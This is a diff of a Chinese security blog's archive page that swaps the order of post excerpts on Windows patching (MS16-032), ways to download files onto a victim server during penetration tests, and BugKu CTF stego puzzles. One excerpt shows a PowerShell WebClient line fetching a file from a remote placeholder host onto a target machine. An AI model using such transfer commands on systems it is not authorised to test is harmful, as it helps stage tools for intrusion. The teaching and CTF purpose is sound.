@@ -362,13 +362,13 @@ exploit-db的详情：https://www.exploit-db.com/exploits/39574/
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
+                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
                                         <p>
-                                            本文转载自原文：13种方式下载文件
-渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。
-0x01 Powershell创建如下PSH脚本：
-$p = New-Object System.Net.WebClient
-$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%...
+                                            # 
+补丁下载各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到Microsoft的官网去查看和下载：https://docs.microsoft.com/zh-cn/security-updates/
+点击左边栏的Security Bulletins可以查找想要看的漏洞
+
+这里以打MS16-032（CVE-2016-0099）的补丁为例：左边栏找到MS16-032，找...
                                         </p>
                                     </div>
                                 </li>
@@ -380,13 +380,13 @@ $p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%...
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/10/04/Windows系统添加补丁/">Windows系统添加补丁</a>
+                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
                                         <p>
-                                            # 
-补丁下载各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到Microsoft的官网去查看和下载：https://docs.microsoft.com/zh-cn/security-updates/
-点击左边栏的Security Bulletins可以查找想要看的漏洞
-
-这里以打MS16-032（CVE-2016-0099）的补丁为例：左边栏找到MS16-032，找...
+                                            本文转载自原文：13种方式下载文件
+渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。
+0x01 Powershell创建如下PSH脚本：
+$p = New-Object System.Net.WebClient
+$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%...
                                         </p>
                                     </div>
                                 </li>
@@ -1112,6 +1112,23 @@ http://123.206.87.240:8002/misc/3.zip
                                     </div>
                                     <div class="timeline-marker"></div>
                                     <div class="timeline-content">
+                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
+                                        <p>
+                                            在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件
+而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：Binwalk、dd、foremost，于是便去了解
+例题：可以借用BUGKU中的这道题，题目地址：
+https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-...
+                                        </p>
+                                    </div>
+                                </li>
+                            
+                                
+                                <li class="timeline-item">
+                                    <div class="timeline-info">
+                                        <span class="gradient-text">February 26, 2019</span>
+                                    </div>
+                                    <div class="timeline-marker"></div>
+                                    <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/02/26/BugKuCTF—杂项题 第1-10关/">BugKuCTF — 杂项题(第1-10关)</a>
                                         <p>
                                             第一关（签到题）关注公众号扫描二维码就能获得flag
@@ -1126,23 +1143,6 @@ http://123.206.87.240:8002/misc/1.jpg
 使用UE（UltraEdit）打开图片看看。发现在最后几行有着Unicode编码
 
 复制这个Unicode编码，通过在线工具转换成ASCII编码后，Fl...
-                                        </p>
-                                    </div>
-                                </li>
-                            
-                                
-                                <li class="timeline-item">
-                                    <div class="timeline-info">
-                                        <span class="gradient-text">February 26, 2019</span>
-                                    </div>
-                                    <div class="timeline-marker"></div>
-                                    <div class="timeline-content">
-                                        <a class="timeline-title" target="_self" href="/knlvre.github.io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/">BugKuCTF — 利用Kali分离图片中的隐藏文件</a>
-                                        <p>
-                                            在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件
-而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：Binwalk、dd、foremost，于是便去了解
-例题：可以借用BUGKU中的这道题，题目地址：
-https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-...
                                         </p>
                                     </div>
                                 </li>
